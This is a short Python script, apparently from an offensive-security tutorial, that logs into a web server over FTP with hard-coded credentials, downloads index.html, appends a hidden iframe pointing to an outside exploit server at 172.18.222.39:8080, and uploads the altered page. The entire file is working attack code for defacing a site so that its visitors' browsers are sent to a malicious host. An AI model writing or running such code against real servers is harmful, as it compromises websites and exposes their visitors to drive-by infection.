import ftplib

def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR '+page, f.write)
	print '[+] Downloaded Page: '+page
	f.write(redirect)
	f.close()
	print '[+] Injected Malicious IFrame on: '+page
	ftp.storlines('STOR '+page, open(page+'.tmp'))
	print '[+] UPloaded Injected Page: '+page

host = '127.0.0.1'
username = 'whoami'
password = 'luser-bash'
ftp = ftplib.FTP(host)
ftp.login(username, password)
redirect = '<iframe src="http://172.18.222.39:8080/p0q9p49VedMaa"></iframe>'
injectPage(ftp, 'index.html',redirect)
